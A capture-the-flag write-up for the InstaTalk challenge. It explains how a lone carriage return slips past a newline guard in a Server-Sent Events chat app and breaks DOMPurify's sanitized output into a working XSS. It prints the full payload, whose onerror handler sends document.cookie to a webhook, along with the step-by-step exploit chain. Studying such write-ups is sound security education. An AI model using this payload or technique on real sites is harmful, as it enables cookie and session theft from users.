# InstaTalk — Alpaca Hack writeup

A real-time chat app (Express 5 + `isomorphic-dompurify`) that pushes messages
to clients over **Server-Sent Events**. Each message is sanitized with
DOMPurify and rendered on the client with `messages.innerHTML += event.data`.
An Admin Bot holds the flag in a **non-`HttpOnly`** cookie and visits the app
with headless Chromium. Goal: XSS → exfil `document.cookie`.

The intended bug is a one-liner in `web/src/app.ts`:

```ts
function createMessage(message: string, from: UUID, to: UUID) {
  const payload = DOMPurify.sanitize(
    `<li><p>${from.slice(0,8)} → ${to.slice(0,8)}</p><p>${message}</p></li>`
      .replaceAll("\n", ""),          // <-- strips LF before sanitizing
  );
  if (payload.includes("\n")) {       // <-- rejects LF after sanitizing
    return `event: message\ndata: [Deleted for security reason.]\n\n`;
  }
  return `event: message\ndata: ${payload}\n\n`;
}
```

DOMPurify is current (3.4.7 in the lockfile); no string-level CVE applies. The
bug is what happens to the sanitized output *after* sanitization — and the
author guarded the wrong newline.

## Architecture

- **web** (`:3000`) — `GET /` sets a signed `HttpOnly` `uuid` cookie and serves
  the SPA. `GET /api/events` is the SSE stream; it registers
  `clients.set(uuid, res)` and writes `event: start\ndata: <uuid>\n\n`.
  `POST /api/send-message {message, to}` validates `to` (must be a UUID) and
  takes `from` from the signed cookie; **both** must be currently connected,
  then writes `createMessage(...)` to each.
- **bot** (`:1337`) — `POST /api/report` launches Puppeteer, sets
  `FLAG=Alpaca{...}` as a **non-`HttpOnly`** cookie, visits the app, reports its
  own SSE UUID, and waits ~10s. The bot renders the *web* app, so the sink we
  attack is the web client's `innerHTML +=`.

The client sink:

```js
const $messages = document.getElementById("messages");          // <ul>, cached once
eventSource.addEventListener("message", (event) => {
  $messages.innerHTML += event.data;                            // the sink
});
```

## The mistake: `\n` is guarded, `\r` is not

The server wants to stop SSE/header injection through the message. It strips
`\n` from the input and refuses any sanitized output containing `\n`. That
closes the obvious "inject a second `data:` line with a newline" attack.

But the **EventSource wire format terminates a line on CR, LF, *or* CRLF**
(WHATWG HTML, *server-sent events*). A lone `\r` is a line break to the parser
but is *not* an `\n`, so it sails past both guards. A surviving `\r` inside the
sanitized payload lets us re-shape the single `data:` line the server emits.

How the parser treats the resulting lines:

| line content                | parser action                                        |
|-----------------------------|------------------------------------------------------|
| `data: X`                   | append `X` + `\n` to the data buffer                 |
| anything without `data:`    | unknown field → **dropped**                          |
| empty line                  | dispatch the event (buffer, minus trailing `\n`)     |

So a `\r` gives us two primitives over the sanitized string:

- **drop** — split the payload so a chunk lands on a line *without* a `data:`
  prefix; it is discarded. This **truncates** the HTML at an arbitrary byte —
  e.g. mid-attribute, leaving a quote open.
- **fold** — put a later chunk on a `data:` line; it is re-appended (joined by
  `\n`). This lets us **re-attach** bytes *after* the truncation point.

Truncate-then-reattach is exactly the "transform the sanitized output" anti-
pattern: it produces a malformed fragment DOMPurify would never emit.

### Where a `\r` survives DOMPurify

`&#13;` decodes to `\r`. It survives serialization only in specific spots
(verified against DOMPurify 3.4.7):

| placement of `&#13;`                | result                       |
|-------------------------------------|------------------------------|
| **mid** attribute value (`"a␍b"`)   | survives as raw `\r` ✅       |
| **trailing** attribute value (`"a␍"`)| stripped ❌                  |
| in **text adjacent to a tag**       | survives as raw `\r` ✅       |
| **inside a tag** (between attrs)     | normalized to `\n` → tripped guard ❌ |

We need two surviving CRs — one mid-`src` (the truncation point) and one in the
text just after the tag (to start the fold line).

## The other half: DOMPurify only escapes `<`, `>`, `&` in text

The server wraps every message as
`` `<li><p>…</p><p>${message}</p></li>` ``, so DOMPurify's input **always**
contains `<` — the "no `<` → return verbatim" fast path never fires here. But it
doesn't need to. Inside a `<p>`, the bytes

```
" onerror="fetch('…'+document.cookie)"
```

are just text. DOMPurify escapes only `<`, `>`, and `&`; the double-quotes,
`onerror=`, parentheses, and backticks pass through untouched. They are inert as
text — until a preceding open quote turns them into attribute syntax during the
browser's parse.

## The payload

```
<img src="PAD&#13;q">&#13;data: " onerror="fetch('WEBHOOK/?c='+encodeURIComponent(document.cookie))"<i>x</i>
```

After wrapping + sanitizing, the server emits this frame (CRs shown as `␍`):

```
event: message
data: <li><p>P</p><p><img src="PAD␍q">␍data: " onerror="fetch('WEBHOOK/?c='+encodeURIComponent(document.cookie))"<i>x</i></p></li>

```

The EventSource parser walks it line by line:

| # | line (split on `␍`/`\n`)                                  | action            |
|---|-----------------------------------------------------------|-------------------|
| 1 | `event: message`                                          | type = `message`  |
| 2 | `data: <li><p>P</p><p><img src="PAD`                      | buffer += `…src="PAD\n` — **quote left open** |
| 3 | `q">`                                                     | no `data:` → **dropped** (kills the real `">`) |
| 4 | `data: " onerror="fetch('…'+…cookie))"<i>x</i></p></li>`  | folded back into buffer |
| 5 | *(blank)*                                                 | dispatch          |

Resulting `event.data`:

```html
<li><p>P</p><p><img src="PAD
" onerror="fetch('WEBHOOK/?c='+encodeURIComponent(document.cookie))"<i>x</i></p></li>
```

Chrome tokenizes the `<img …>`:

1. `<img src="PAD\n` — opens a quoted `src` value.
2. the smuggled `"` — closes `src` (value `PAD\n`, an invalid URL).
3. ` onerror="fetch(…)"` — a fresh attribute on the **live `<img>`**.
4. `<i>` — `<` and `i` become a bogus attribute; the `>` closes the `<img>` tag.

`src="PAD\n"` fails to load → `onerror` fires → `document.cookie` (including the
bot's `FLAG`) is shipped to the webhook.

## The chain

1. `POST /api/report` → bot connects and reports its SSE UUID (our `to`).
2. `GET /` → obtain our signed `uuid` cookie (our `from`).
3. Open `GET /api/events` in a background thread → registers our UUID in
   `clients`. `send-message` requires **both** `from` and `to` connected.
4. `POST /api/send-message` with `to = <bot uuid>` and the payload above.
   The bot's `innerHTML +=` parses it, `onerror` fires, cookie exfiltrates.

## Solver

See `solve.py`:
